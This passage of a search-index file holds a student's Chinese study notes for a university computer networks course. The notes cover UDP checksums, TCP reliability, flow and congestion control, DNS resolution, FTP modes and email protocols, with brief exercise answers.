<li>\u82e5\u63a5\u6536\u65b9UDP\u53d1\u73b0\u76ee\u7684\u7aef\u53e3\u4e0d\u5b58\u5728\u4e8e\u5bf9\u65b9\u4e3b\u673a\uff0c\u5219ICMP\u53d1\u9001\u7aef\u53e3\u4e0d\u53ef\u8fbe\u5dee\u9519\u62a5\u6587</li> </ul>"},{"location":"ZJU-course/%E8%AE%A1%E7%BD%91/%E4%BC%A0%E8%BE%93%E5%B1%82/#22-udp","title":"2.2 UDP\u68c0\u9a8c","text":"<p>\u8ba1\u7b97\u68c0\u9a8c\u548c\u7684\u65f6\u5019\uff0c\u5728UDP\u6570\u636e\u62a5\u524d\u9762\u52a0\u4e0a12B\u7684\u4f2a\u9996\u90e8\uff0c\u8fd9\u4e2a\u4e1c\u897f\u53ea\u5728\u8ba1\u7b97\u68c0\u9a8c\u548c\u7684\u65f6\u5019\u5b58\u5728</p> <p>\u200b\u200b</p> <p>\u5dee\u9519\u68c0\u6d4b\u7684\u65b9\u6cd5\u5982\u4e0b</p> <p>\u200b\u200b</p> <p>\u7b80\u5355\u6765\u8bf4\u5c31\u662f</p> <ul> <li>\u68c0\u9a8c\u548c\u5148\u8bbe\u7f6e\u4e3a0</li> <li>\u52a0\u4e0a\u4f2a\u9996\u90e8\uff0c\u628a\u6570\u636e\u8865\u621016bit\u7684\u6574\u6570\u500d</li> <li>\u53cd\u7801\u8ba1\u7b97\u548c\uff0c\u7136\u540e\u53d6\u53cd\u7801\uff0c\u4f5c\u4e3a\u68c0\u9a8c\u548c</li> <li>\u53d1\u9001</li> </ul> <p>\u4f8b\u5b50\u5982\u4e0b</p> <p>\u200b\u200b</p>"},{"location":"ZJU-course/%E8%AE%A1%E7%BD%91/%E4%BC%A0%E8%BE%93%E5%B1%82/#_2","title":"\u4e60\u9898","text":"<p>\u200b\u200b</p> <ul> <li>B \u5e94\u8be5\u5168\u4e3a1</li> </ul> <p>\u200b\u200b</p> <ul> <li>C UDP\u4e3a8B\uff0cIP\u4e3a60B\uff0c\u4ee5\u592a\u7f51\u4e3a18B</li> </ul>"},{"location":"ZJU-course/%E8%AE%A1%E7%BD%91/%E4%BC%A0%E8%BE%93%E5%B1%82/#3-tcp","title":"3. TCP","text":"<p>TCP\u7684\u4f20\u8f93\u5355\u5143\u79f0\u4e3a\u62a5\u6587\u6bb5\uff08segment\uff09\uff0c\u5176\u5efa\u7acb\u5728\u4e0d\u53ef\u9760\u7684IP\u5c42\u4e0a\u9762\uff0c\u4f46\u662f\u89e3\u51b3\u4e86\u4f20\u8f93\u7684\u53ef\u9760\uff0c\u6709\u5e8f\uff0c\u65e0\u4e22\u5931\u548c\u4e0d\u91cd\u590d\u95ee\u9898\uff0c\u6709\u4ee5\u4e0b\u7279\u70b9</p> <p>\u200b\u200b</p> <p>TCP\u53d1\u9001\u62a5\u6587\u7684\u957f\u5ea6\u7531\u5f53\u524d\u7684\u7a97\u53e3\u503c\u548c\u7f51\u7edc\u62e5\u585e\u7a0b\u5ea6\u6765\u51b3\u5b9a</p> <p>TCP\u7684\u4f20\u8f93\u9762\u5411\u5b57\u8282\u6d41</p>"},{"location":"ZJU-course/%E8%AE%A1%E7%BD%91/%E4%BC%A0%E8%BE%93%E5%B1%82/#31-tcp-segment","title":"3.1 TCP segment","text":"<p>TCP\u9996\u90e8\u7684\u957f\u5ea6\u572820B\u523060B\uff0c\u540e\u9762\u7531N\u4e2a\u53ef\u9009\u9879\uff0c\u6bcf\u4e2a\u53ef\u9009\u9879\u7684\u957f\u5ea6\u4e3a4B\uff0c\u5982\u679c\u4e0d\u52304B\u5c31\u586b\u5145\u52304B</p> <p>\u200b\u200b</p> <p>\u200b\u200b</p> <p>\u200b\u200b</p>"},{"location":"ZJU-course/%E8%AE%A1%E7%BD%91/%E4%BC%A0%E8%BE%93%E5%B1%82/#32-tcp","title":"3.2 TCP\u8fde\u63a5\u7ba1\u7406","text":"<p>TCP\u7684\u8fde\u63a5\u91c7\u7528\u5ba2\u6237\u7aef\u670d\u52a1\u7aef\u6a21\u5f0f\uff0c\u53d1\u8d77\u8fde\u63a5\u7684\u662fClient\uff0c\u54cd\u5e94\u8fde\u63a5\u7684\u662fServer</p> <p>TCP\u8fde\u63a5\u5efa\u7acb</p> <p>\u200b\u200b</p> <p>\u4e09\u6b21\u63e1\u624b\uff0c\u524d\u4e24\u6b21\u90fd\u4e0d\u80fd\u643a\u5e26\u6570\u636e\uff0c\u5e76\u4e14\u8981\u6d88\u8017\u6389\u5404\u81ea\u4e00\u4e2a\u5e8f\u53f7\uff0c\u7b2c\u4e09\u6b21\u53ef\u4ee5\u643a\u5e26\u6570\u636e\u4e86\uff0c\u5982\u679c\u7b2c\u4e09\u6b21\u4e0d\u643a\u5e26\u6570\u636e\u4e5f\u4e0d\u4f1a\u6d88\u8017\u8be5\u5e8f\u53f7</p> <p>TCP\u8fde\u63a5\u91ca\u653e</p> <p>\u200b\u200b</p> <p>\u5728TCP\u8fde\u63a5\u91ca\u653e\u8fc7\u7a0b\u4e2d\uff0c\u4ece\u5ba2\u6237\u7aef\u53d1\u9001FIN\u62a5\u6587\u7b97\u8d77</p> <ul> <li>\u5ba2\u6237\u7aef\u6700\u5c11\u7b49\u5f85 1RTT+2MSL</li> <li>\u670d\u52a1\u7aef\u6700\u5c11\u7b49\u5f85 1.5RTT</li> </ul> <p>\u200b\u200b</p>"},{"location":"ZJU-course/%E8%AE%A1%E7%BD%91/%E4%BC%A0%E8%BE%93%E5%B1%82/#33-tcp","title":"3.3 TCP\u53ef\u9760\u4f20\u8f93","text":"<p>TCP\u91c7\u7528\u4e86\u68c0\u9a8c\uff0c\u5e8f\u53f7\uff0c\u786e\u8ba4\u548c\u91cd\u4f20\u673a\u5236\u5b9e\u73b0\u53ef\u9760\u4f20\u8f93\uff0cTCP\u7684\u68c0\u9a8c\u673a\u5236\u548cUDP\u4e00\u6837\uff1f</p> <p>\u5e8f\u53f7</p> <p>TCP\u5c06\u53d1\u9001\u7684\u6570\u636e\u89c6\u4f5c\u5b57\u8282\u6d41\uff0c\u6bcf\u4e2a\u5b57\u8282\u90fd\u6807\u4e0a\u53f7\uff0c\u6bcf\u4e2aTCP segment\u4e2d\u7684\u5e8f\u53f7\uff0c\u4f1a\u6807\u8bb0\u4e0a\u8be5segment\u4e2d\u7b2c\u4e00\u4e2a\u5b57\u8282\u7684\u5e8f\u53f7</p> <p>\u200b\u200b</p> <p>\u786e\u8ba4</p> <p>TCP\u9996\u90e8\u7684\u786e\u8ba4\u53f7\uff0c\u662f\u671f\u671b\u6536\u5230\u5bf9\u65b9\u7684\u4e0b\u4e00\u4e2a\u62a5\u6587\u7684\u6570\u636e\u7684\u7b2c\u4e00\u4e2a\u5b57\u8282\u7684\u5e8f\u53f7\uff0c\u5982\u4e0a\u56fe\uff0c\u6211\u4eec\u5982\u679c\u6536\u5230\u4e86012\uff0c\u90a3\u4e48\u6211\u5e0c\u671b\u6536\u5230\u7684\u4e0b\u4e00\u4e2a\u62a5\u6587\u5c31\u662f3\uff0c\u56e0\u6b64\u786e\u8ba4\u53f7\u662f3</p> <p>TCP\u91c7\u7528\u7c7b\u4f3c\u4e8e\u540e\u9000N\u5e27\u7684\u7d2f\u79ef\u786e\u8ba4\uff0c\u5982\u679c\u6211\u4eec\u6536\u5230\u4e86012\u548c678\uff0c\u6211\u4eec\u7684\u786e\u8ba4\u53f7\u4f9d\u65e7\u4e3a3</p> <p>\u91cd\u4f20</p> <p>\u8981\u4fdd\u8bc1\u53ef\u9760\u7684\u4f20\u8f93\uff0c\u8fd8\u662f\u5f97\u4f9d\u8d56\u91cd\u4f20\u673a\u5236\uff0c\u89e6\u53d1\u91cd\u4f20\u673a\u5236\u6709\u4ee5\u4e0b\u4e24\u79cd\u53ef\u80fd</p> <ul> <li> <p>\u8d85\u65f6</p> </li> <li> <p>TCP\u6bcf\u6b21\u53d1\u9001\u4e00\u4e2asegment\uff0c\u90fd\u8bbe\u8ba1\u4e00\u4e2a\u8d85\u65f6\u8ba1\u65f6\u5668\uff0c\u82e5\u91cd\u4f20\u65f6\u95f4\u5230\u4e86\u8fd8\u672a\u6536\u5230\u786e\u8ba4\uff0c\u5c31\u91cd\u4f20\u8fd9\u4e2a\u62a5\u6587</p> </li> <li>\u8d85\u65f6\u8ba1\u65f6\u5668\u7684\u65f6\u95f4\u4e0d\u662f\u56fa\u5b9a\u7684\uff0c\u5176\u4f1a\u8bb0\u5f55\u6bcf\u6b21\u53d1\u9001\u548c\u6536\u5230\u786e\u8ba4\u7684\u5f80\u8fd4\u65f6\u95f4RTT\uff0c\u5e76\u4e14\u8ba1\u7b97\u4e00\u4e2a\u52a0\u6743\u65f6\u95f4RTTS\uff0c\u8ba9\u6bcf\u6b21\u7684RTT\u90fd\u5f71\u54cd\u6211\u4eecRTTS\uff0c\u6211\u4eec\u7684RTO\u5e94\u8be5\u7a0d\u5fae\u5927\u4e8eRTTS</li> <li> <p>\u5197\u4f59ACK</p> </li> <li> <p>\u5728\u8fd8\u672a\u8d85\u65f6\u7684\u65f6\u5019\uff0c\u5982\u679c\u4ea7\u751f\u4e86\u5197\u4f59ACK\uff0c\u4f1a\u5bfc\u81f4\u91cd\u4f20</p> </li> <li>\u5197\u4f59ACK\u7684\u8bbe\u7f6e\u662f3\u6b21\u91cd\u590dACK\u7684\u53d1\u9001\uff0c\u8fd9\u4e2a3\u6b21\u662f\u56fa\u5b9a\u7684</li> <li>\u5197\u4f59ACK\u7684\u89e6\u53d1\uff0c\u662f\u5f53\u63a5\u6536\u65b9\u83b7\u53d6\u4e86\u6bd4\u81ea\u5df1\u671f\u671b\u66f4\u5927\u5e8f\u53f7\u7684\u6570\u636e\u65f6\uff0c\u6bd4\u598212345\uff0c\u6211\u671f\u671b2\uff0c\u4f46\u662f\u6211\u6536\u5230\u4e86345\uff0c\u6b64\u65f6\u6211\u4f1a\u53d1\u9001\u591a\u4e2a\u5bf92\u7684ACK\uff0c\u76f4\u63a5\u89e6\u53d1\u91cd\u4f20\u673a\u5236</li> <li>\u8fd9\u79cd\u6280\u672f\u4e5f\u79f0\u4e3a\u5feb\u901f\u91cd\u4f20</li> </ul>"},{"location":"ZJU-course/%E8%AE%A1%E7%BD%91/%E4%BC%A0%E8%BE%93%E5%B1%82/#34-tcp","title":"3.4 TCP\u6d41\u91cf\u63a7\u5236","text":"<p>TCP\u540c\u6837\u4f7f\u7528\u6ed1\u52a8\u7a97\u53e3\u6765\u5b9e\u73b0\u6d41\u91cf\u63a7\u5236\uff0c\u8981\u6c42\u53d1\u9001\u65b9\u7ef4\u6301\u4e00\u4e2a\u63a5\u6536\u7a97\u53e3rwnd\uff0c\u5c31\u662f\u8ba9\u53d1\u9001\u65b9\u77e5\u6653\u63a5\u6536\u65b9\u7684\u63a5\u53d7\u80fd\u529b\uff0c\u63a5\u6536\u65b9\u4f1a\u5728\u53d1\u9001\u7684\u62a5\u6587\u4e2d\u8bbe\u7f6e\u201c\u7a97\u53e3\u201d\u5b57\u6bb5\uff0c\u6765\u4f7f\u5f97\u53d1\u9001\u65b9\u77e5\u6653\u8fd9\u4e00\u70b9\uff0c\u53d1\u9001\u65b9\u7684\u53d1\u9001\u7a97\u53e3\u4e0d\u5f97\u591a\u4f59\u63a5\u6536\u7a97\u53e3</p> <p>\u200b\u200b</p> <ul> <li>\u53d1\u9001\u7a97\u53e3\u53ea\u9650\u5236\u53ef\u4ee5\u53d1\u9001\u7684\u5185\u5bb9\uff0c\u4e0d\u9650\u5236\u91cd\u4f20</li> </ul> <p>\u200b\u200b</p>"},{"location":"ZJU-course/%E8%AE%A1%E7%BD%91/%E4%BC%A0%E8%BE%93%E5%B1%82/#35-tcp","title":"3.5 TCP\u62e5\u585e\u63a7\u5236","text":"<p>\u62e5\u585e\u63a7\u5236\u662f\u9488\u5bf9\u6574\u4e2a\u7f51\u7edc\u7684\u627f\u53d7\u80fd\u529b\u800c\u8a00\u7684\uff0c\u800c\u6d41\u91cf\u63a7\u5236\u662f\u7aef\u5bf9\u7aef\u7684\u63a5\u53d7\u80fd\u529b\u800c\u8a00\u7684</p> <p>\u53d1\u9001\u65b9\u5728\u786e\u5b9a\u53d1\u9001\u62a5\u6587\u7684\u901f\u7387\u7684\u65f6\u5019\uff0c\u65e2\u8981\u8003\u8651\u63a5\u53d7\u65b9\u7684\u63a5\u53d7\u80fd\u529b\uff0c\u4e5f\u8981\u8003\u8651\u7f51\u7edc\u7684\u62e5\u585e\u7a0b\u5ea6\uff0c\u56e0\u6b64\u53d1\u9001\u65b9\u8fd8\u8981\u7ef4\u62a4\u4e00\u4e2a\u62e5\u585e\u7a97\u53e3cwnd</p> <p>\u53d1\u9001\u7a97\u53e3\u7684\u4e0a\u9650\u662f\\(\\min\\{rwnd,cwnd\\}\\)</p> <p>\u6162\u5f00\u59cb\u548c\u62e5\u585e\u907f\u514d</p> <p>\u6162\u5f00\u59cb\u7684\u6838\u5fc3\u5728\u4e8e\uff0c\u9996\u5148\u53d1\u9001\u5c11\u91cf\u6570\u636e\uff0c\u68c0\u6d4b\u62e5\u585e\u60c5\u51b5\uff0c\u82e5\u6ca1\u6709\u53d1\u751f\u62e5\u585e\uff0c\u518d\u6162\u6162\u589e\u52a0\u53d1\u9001\u7a97\u53e3</p> <ul> <li>cwnd \u4ece 1 \u5f00\u59cb\uff0c\u6bcf\u6b21\u6b63\u786e\u6536\u5230\u4e00\u4e2a\u786e\u8ba4\u5219\u7ffb\u500d</li> </ul> <p>\u6211\u4eec\u9700\u8981\u8bbe\u7f6e\u4e00\u4e2a\u6162\u5f00\u59cb\u95e8\u9650 ssthresh \uff0c\u5f53cwnd\u589e\u5927\u5230\u8fd9\u4e2a\u95e8\u9650\u7684\u65f6\u5019\uff0c\u6539\u7528\u62e5\u585e\u907f\u514d</p> <p>\u62e5\u585e\u907f\u514d\u7684\u6838\u5fc3\u5c31\u662f\uff0c\u6bcf\u6b21\u7ecf\u8fc7\u4e00\u4e2aRTT\u5c31\u4f7f\u5f97cwnd\u589e\u52a01</p> <p>\u4e0d\u8bba\u662f\u6162\u5f00\u59cb\u8fd8\u662f\u62e5\u585e\u907f\u514d\uff0c\u53ea\u8981\u6211\u4eec\u68c0\u6d4b\u5230\u62e5\u585e\uff08\u672a\u6536\u5230\u786e\u8ba4\uff09\u5c31\u628assthresh\u8bbe\u7f6e\u4e3a\u5f53\u524dcwnd\u7684\u4e00\u534a\uff0c\u518d\u6b21\u4ece1\u5f00\u59cb\u8fdb\u884c\u6162\u5f00\u59cb</p> <p>\u200b\u200b</p> <p>\u5feb\u91cd\u4f20\u548c\u5feb\u6062\u590d</p> <p>\u5feb\u91cd\u4f20\u673a\u5236\u5c31\u662f\u6211\u4eec\u4e4b\u524d\u63d0\u5230\u7684\u5197\u4f59ACK\uff0c\u56e0\u4e3a\u62a5\u6587\u4e22\u5931\u4e0d\u4e00\u5b9a\u662f\u56e0\u4e3a\u7f51\u7edc\u62e5\u585e\uff0c\u4e5f\u53ef\u80fd\u53ea\u662f\u5355\u7eaf\u7684\u51fa\u9519\u4e4b\u7c7b\u7684\uff0c\u56e0\u6b64\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u6211\u4eec\u5e94\u8be5\u91c7\u7528\u5feb\u6062\u590d\u7b97\u6cd5</p> <p>\u5f53\u6211\u4eec\u89e6\u53d1\u5197\u4f59ACK\u7684\u673a\u5236\u65f6\uff0c\u6211\u4eec\u5c06ssthresh\u8bbe\u7f6e\u4e3acwnd\u7684\u4e00\u534a\uff0ccwnd\u4e5f\u8bbe\u7f6e\u4e3acwnd\u7684\u4e00\u534a\uff0c\u7136\u540e\u6267\u884c\u62e5\u585e\u907f\u514d\uff0c\u4f7f\u5176\u7ebf\u6027\u589e\u5927</p> <p>\u200b\u200b</p>"},{"location":"ZJU-course/%E8%AE%A1%E7%BD%91/%E4%BC%A0%E8%BE%93%E5%B1%82/#_3","title":"\u4e60\u9898","text":"<p>\u200b\u200b</p> <ul> <li>D</li> </ul>"},{"location":"ZJU-course/%E8%AE%A1%E7%BD%91/%E4%BC%A0%E8%BE%93%E5%B1%82/#_4","title":"\u4e60\u9898","text":"<p>\u200b\u200b</p> <p>\u200b\u200b</p> <ul> <li>\uff1f\u4e0d\u61c2</li> </ul> <p>\u200b\u200b</p> <ul> <li>\u5728\u5230\u7a97\u53e3\u4e4b\u524d\u5c31\u9700\u8981\u52a0\u4e00</li> </ul> <p>\u200b\u200b</p> <ul> <li>12582^8 / 30</li> </ul> <p>\u200b\u200b</p> <ul> <li>\u6700\u5927\u541e\u5410\u91cf\u662f 65535 / \uff0820*10^-3\uff09\u8fd9\u4e2a\u662f\u4ec0\u4e48\u610f\u601d\uff1f</li> </ul> <p>\u200b\u200b</p> <ul> <li>\u6211\u611f\u89c9\u8fd9\u9898\u5c31\u662fA\u554a</li> </ul> <p>\u200b\u200b</p> <p>\u200b\u200b</p> <ul> <li>\u4f3c\u4e4e\u662f\u7528\u6765\u5feb\u6062\u590d\uff0c11\uff0c\u770b\u5230Reno\u5c31\u4f7f\u7528\u5feb\u6062\u590d</li> </ul> <p>\u200b\u200b</p> <ul> <li>Jacobson\u7b97\u6cd5 \u5f53\u524d\u4e58\u4ee5a\uff0c\u65b0\u6765\u7684\u4e58\u4ee5\uff081-a\uff09</li> </ul> <p>\u200b\u200b</p> <ul> <li>\u5947\u5947\u602a\u602a\u7684\u9898\u76ee\u8868\u8ff0</li> </ul> <p>\u200b\u200b</p> <ul> <li>\u5173\u4e8eTCP\u7684ack\u7684\u63cf\u8ff0</li> </ul> <p>\u200b\u200b</p> <ul> <li>six transmission \u548c six RTT \u4f3c\u4e4e\u662f\u4e0d\u540c\u7684\u8868\u8ff0</li> </ul> <p>\u200d</p>"},{"location":"ZJU-course/%E8%AE%A1%E7%BD%91/%E5%BA%94%E7%94%A8%E5%B1%82/","title":"\u5e94\u7528\u5c42","text":""},{"location":"ZJU-course/%E8%AE%A1%E7%BD%91/%E5%BA%94%E7%94%A8%E5%B1%82/#1","title":"1. \u7f51\u7edc\u5e94\u7528\u6a21\u578b","text":"<ul> <li>C/S\u6a21\u578b</li> <li>P2P\u6a21\u578b</li> </ul>"},{"location":"ZJU-course/%E8%AE%A1%E7%BD%91/%E5%BA%94%E7%94%A8%E5%B1%82/#2-dns","title":"2. \u57df\u540d\u7cfb\u7edfDNS","text":"<p>\u57df\u540d\u7cfb\u7edf\u7684\u610f\u4e49\u5728\u4e8e\u5c06\u4eba\u4eec\u8bb0\u5fc6\u7684\u57df\u540d\uff0c\u8f6c\u6362\u6210IP\u5730\u5740</p> <ul> <li>DNS\u91c7\u53d6C/S\u6a21\u578b\uff0c\u4f7f\u7528UDP\uff0c\u91c7\u53d653\u53f7\u7aef\u53e3</li> </ul>"},{"location":"ZJU-course/%E8%AE%A1%E7%BD%91/%E5%BA%94%E7%94%A8%E5%B1%82/#21","title":"2.1 \u5c42\u6b21\u57df\u540d\u7a7a\u95f4","text":"<p>\u200b\u200b</p> <p>\u57df\u540d\u6709\u4ee5\u4e0b\u7279\u70b9</p> <ul> <li>\u4e0d\u533a\u5206\u5927\u5c0f\u5199</li> <li>\u9664\u4e86'-'\u4e0d\u80fd\u6709\u5176\u4ed6\u6807\u70b9\u7b26\u53f7</li> <li>\u6bcf\u4e2a\u6807\u53f7\u4e0d\u8d85\u8fc763\u5b57\u7b26\uff0c\u7ec4\u6210\u7684\u5b8c\u6574\u57df\u540d\u4e0d\u8d85\u8fc7255\u5b57\u7b26</li> </ul> <p>\u200b\u200b</p> <p>\u9876\u7ea7\u57df\u540d\u7531ICANN\u7ba1\u7406\uff0c\u540e\u7eed\u7684\u57df\u540d\u7531\u62e5\u6709\u8be5\u57df\u540d\u7684\u7ec4\u7ec7\u81ea\u884c\u7ba1\u7406</p>"},{"location":"ZJU-course/%E8%AE%A1%E7%BD%91/%E5%BA%94%E7%94%A8%E5%B1%82/#22","title":"2.2 \u57df\u540d\u670d\u52a1\u5668","text":"<p>\u57df\u540d\u670d\u52a1\u5668\u8d1f\u8d23\u6267\u884c\u57df\u540d\u5230IP\u5730\u5740\u7684\u89e3\u6790</p> <ul> <li>\u6839\u57df\u540d\u670d\u52a1\u5668\uff0c\u662f\u6700\u9ad8\u5c42\u6b21\uff0c\u672c\u5730\u57df\u540d\u670d\u52a1\u5668\u81ea\u5df1\u65e0\u6cd5\u89e3\u6790\u7684\u65f6\u5019\uff0c\u9996\u5148\u6c42\u52a9\u4e8e\u6839\u57df\u540d\u670d\u52a1\u5668\uff0c\u4e3b\u8981\u662f\u544a\u8bc9\u672c\u5730\u57df\u540d\u670d\u52a1\u5668\u53bb\u54ea\u4e2a\u9876\u7ea7\u57df\u540d\u670d\u52a1\u5668\u627e</li> <li>\u9876\u7ea7\u57df\u540d\u670d\u52a1\u5668\uff0c\u8d1f\u8d23\u7ba1\u7406\u5728\u8be5\u9876\u7ea7\u57df\u540d\u6ce8\u518c\u7684\u6240\u6709\u4e8c\u7ea7\u57df\u540d</li> <li> <p>\u6743\u9650\u57df\u540d\u670d\u52a1\u5668\uff0c\u6bcf\u53f0\u4e3b\u673a\u5fc5\u987b\u5728\u6743\u9650\u57df\u540d\u670d\u52a1\u5668\u5904\u7b49\u7ea7\uff0c\u8bb8\u591a\u4e3b\u673a\u8981\u5728\u4e24\u53f0\u767b\u8bb0\uff0c\u6743\u9650\u57df\u540d\u670d\u52a1\u5668\u5f80\u5f80\u4e5f\u5145\u5f53\u672c\u5730\u57df\u540d\u670d\u52a1\u5668</p> </li> <li> <p>\u53ef\u4ee5\u5c06\u5176\u7ba1\u8f96\u7684\u57df\u540d\u8f6c\u6362\u6210IP\u5730\u5740</p> </li> <li>\u672c\u5730\u57df\u540d\u670d\u52a1\u5668\uff0c\u7ba1\u7406\u672c\u5730\u7684\u6620\u5c04\u5173\u7cfb</li> </ul> <p>\u200b\u200b</p>"},{"location":"ZJU-course/%E8%AE%A1%E7%BD%91/%E5%BA%94%E7%94%A8%E5%B1%82/#23","title":"2.3 \u57df\u540d\u89e3\u6790\u8fc7\u7a0b","text":"<p>\u57df\u540d\u89e3\u6790\u6709\u4e24\u79cd\u65b9\u5f0f</p> <ul> <li>\u9012\u5f52\u67e5\u8be2\uff0c\u662f\u6307\u4e3b\u673a\u5411\u672c\u5730\u57df\u540d\u670d\u52a1\u5668\u7684\u67e5\u8be2\uff0c\u7136\u540e\u672c\u5730\u57df\u540d\u670d\u52a1\u5668\u4e0d\u77e5\u9053\u7684\u60c5\u51b5\u4e0b\uff0c\u7531\u4f5c\u4e3a\u5ba2\u6237\u5411\u6839\u57df\u540d\u670d\u52a1\u5668\u67e5\u8be2</li> <li>\u8fed\u4ee3\u67e5\u8be2\uff0c\u672c\u5730\u57df\u540d\u670d\u52a1\u5668\u5411\u5176\u4ed6\u670d\u52a1\u5668\u7684\u67e5\u8be2\uff0c\u53ef\u80fd\u662f\u9012\u5f52\uff0c\u4e5f\u53ef\u80fd\u662f\u8fed\u4ee3</li> </ul> <p>\u4e24\u8005\u7684\u533a\u522b\u5728\u4e8e\uff0c\u9012\u5f52\u662f\u628a\u540e\u7eed\u7684\u5de5\u4f5c\u90fd\u4ea4\u7ed9\u7684\u65b0\u7684\u670d\u52a1\u5668\uff0c\u800c\u8fed\u4ee3\u662f\u65b0\u7684\u670d\u52a1\u5668\u544a\u8bc9\u8001\u7684\u670d\u52a1\u5668\uff0c\u6211\u5e94\u8be5\u662f\u53bb\u54ea\u91cc\u627e</p>"},{"location":"ZJU-course/%E8%AE%A1%E7%BD%91/%E5%BA%94%E7%94%A8%E5%B1%82/#_2","title":"\u4e60\u9898","text":"<p>\u200b\u200b</p> <ul> <li>\u4e0d\u77e5\u9053\u5728\u80e1\u8a00\u4e71\u8bed\u4e00\u4e9b\u4ec0\u4e48\u4e1c\u897f</li> </ul> <p>\u200b\u200b</p> <ul> <li>C</li> </ul> <p>\u200b\u200b</p> <ul> <li>D \u8981\u5efa\u7acbTCP\u8fde\u63a5HTML\u8bf7\u6c42\u662fTCP</li> </ul>"},{"location":"ZJU-course/%E8%AE%A1%E7%BD%91/%E5%BA%94%E7%94%A8%E5%B1%82/#3-ftp","title":"3. FTP","text":"<p>FTP\u662f\u6587\u4ef6\u4f20\u8f93\u534f\u8bae</p> <ul> <li>\u91c7\u7528C/S\u7684\u6a21\u5f0f\uff0cTCP\uff0c\u752821\u7aef\u53e3</li> </ul> <p>21\u7aef\u53e3\u662f\u63a7\u5236\u7aef\u53e3\uff0c\u7b49\u5f85\u7528\u6237\u8fdb\u7a0b\u53d1\u9001\u94fe\u63a5\u8bf7\u6c42\uff0c\u800c\u4ece\u5c5e\u8fdb\u7a0b\u7528\u6765\u5904\u7406\u7528\u6237\u8fdb\u7a0b\u53d1\u9001\u7684\u8bf7\u6c42</p> <p>FTP\u6709\u4e24\u4e2a\u5e76\u884c\u7684TCP\u8fde\u63a5\uff0c\u4e00\u4e2a\u662f\u63a7\u5236\u8fde\u63a5\uff0c\u4e00\u4e2a\u662f\u6570\u636e\u8fde\u63a5</p> <p>\u5f53\u63a7\u5236\u8fdb\u7a0b\u63a5\u6536\u5230FTP\u7528\u6237\u7684\u6587\u4ef6\u4f20\u8f93\u8bf7\u6c42\u4e4b\u540e\uff0c\u5c31\u521b\u5efa\u6570\u636e\u4f20\u8f93\u8fdb\u7a0b\u548c\u6570\u636e\u8fde\u63a5\uff0c\u6570\u636e\u8fde\u63a5\u6709\u4e24\u79cd\u4f20\u8f93\u6a21\u5f0f\uff0c\u4e3b\u52a8\u6a21\u5f0fPORT\u548c\u88ab\u52a8\u6a21\u5f0fPASV</p> <ul> <li>PORT\uff1a\u5ba2\u6237\u7aef\u5b8c\u6210\u63a7\u5236\u8fde\u63a5\u4e4b\u540e\uff0c\u968f\u673a\u5f00\u53d1\u4e00\u4e2a\u7aef\u53e3\uff0c\u544a\u8bc9\u670d\u52a1\u5668\u7aef\u53e3\u53f7\uff0c\u670d\u52a1\u5668\u77e5\u9053\u4e4b\u540e\uff0c\u901a\u8fc720\u7aef\u53e3\u548c\u5ba2\u6237\u7aef\u5f00\u53d1\u7684\u7aef\u53e3\uff0c\u53d1\u9001\u6570\u636e</li> <li>PASV\uff1a\u5ba2\u6237\u7aef\u5b8c\u6210\u63a7\u5236\u8fde\u63a5\u4e4b\u540e\uff0c\u8ba9\u670d\u52a1\u7aef\u968f\u673a\u5f00\u653e\u4e00\u4e2a\u7aef\u53e3\uff0c\u5e76\u544a\u8bc9\u5ba2\u6237\u7aef\uff0c\u7136\u540e\u4f20\u6570\u636e</li> </ul> <p>\u8fd9\u4e2a\u4e24\u79cd\u6a21\u5f0f\u7684\u9009\u62e9\u6743\u5728\u5ba2\u6237\u7aef</p> <p>\u200b\u200b</p>"},{"location":"ZJU-course/%E8%AE%A1%E7%BD%91/%E5%BA%94%E7%94%A8%E5%B1%82/#_3","title":"\u4e60\u9898","text":"<p>\u200b\u200b</p> <ul> <li>\u4ece\u5e94\u7528\u5c42\u5230\u7269\u7406\u5c42 \u7b54\u6848\u662fB</li> </ul>"},{"location":"ZJU-course/%E8%AE%A1%E7%BD%91/%E5%BA%94%E7%94%A8%E5%B1%82/#4","title":"4. \u7535\u5b50\u90ae\u4ef6","text":"<p>\u200b\u200b</p> <ul> <li>SMTP\u662fpush\u7684\u65b9\u5f0f</li> <li>POP3\u662fpull\u7684\u65b9\u5f0f</li> </ul>"},{"location":"ZJU-course/%E8%AE%A1%E7%BD%91/%E5%BA%94%E7%94%A8%E5%B1%82/#41","title":"4.1 \u7535\u5b50\u90ae\u4ef6\u683c\u5f0f","text":"<p>\u90ae\u4ef6\u6709\u9996\u90e8+\u4e3b\u4f53\uff0c\u9996\u90e8\u4e00\u822c\u6709\u4e09\u4e2a\u90e8\u5206\uff0c\u5176\u4e2dFrom\u548cTo\u662f\u5fc5\u586b\u7684\uff0cSubject\u662f\u53ef\u9009\u7684</p> <p>\u200b\u200b</p> <p>\u9996\u90e8\u548c\u4e3b\u4f53\u4e4b\u95f4\u7528\u4e00\u4e2a\u7a7a\u884c\u8fdb\u884c\u5206\u5272</p> <p>\u200b\u200b</p> <p>MIME</p> <p>SMTP\u53ea\u80fd\u4f20\u90017\u4f4dASCII\u7684\u6587\u672c\uff0c\u800c\u6211\u4eec\u8981\u4f20\u8f93\u4e2d\u6587\u6216\u8005\u5176\u4ed6\u4e8c\u8fdb\u5236\u5bf9\u8c61\u7684\u65f6\u5019\uff0c\u8981\u5148\u7528MIME\u8fdb\u884c\u4e00\u6b65\u8f6c\u6362</p> <p>\u200b\u200b</p> <p>\u200b\u200b</p>"},{"location":"ZJU-course/%E8%AE%A1%E7%BD%91/%E5%BA%94%E7%94%A8%E5%B1%82/#42-smtp","title":"4.2 SMTP","text":"<ul> <li>\u91c7\u7528 C/S \u6a21\u5f0f\uff0c\u4f7f\u7528TCP\uff0c\u7aef\u53e3\u53f7\u4e3a25</li> </ul> <p>\u200b\u200b</p>"},{"location":"ZJU-course/%E8%AE%A1%E7%BD%91/%E5%BA%94%E7%94%A8%E5%B1%82/#43-pop3","title":"4.3 POP3","text":"<ul> <li>\u91c7\u7528C/S\u6a21\u5f0f\uff0c\u4f7f\u7528TCP\uff0c\u7aef\u53e3\u53f7\u4f4d110</li> </ul> <p>\u200b\u200b</p>"},{"location":"ZJU-course/%E8%AE%A1%E7%BD%91/%E5%BA%94%E7%94%A8%E5%B1%82/#_4","title":"\u4e60\u9898","text":"<p>\u200b\u200b</p> <ul> <li>A \u6d4f\u89c8\u5668\u548c\u90ae\u4ef6\u670d\u52a1\u5668\u4e4b\u95f4\u4e00\u822c\u53ea\u7528HTTP</li> </ul> <p>\u200b\u200b</p> 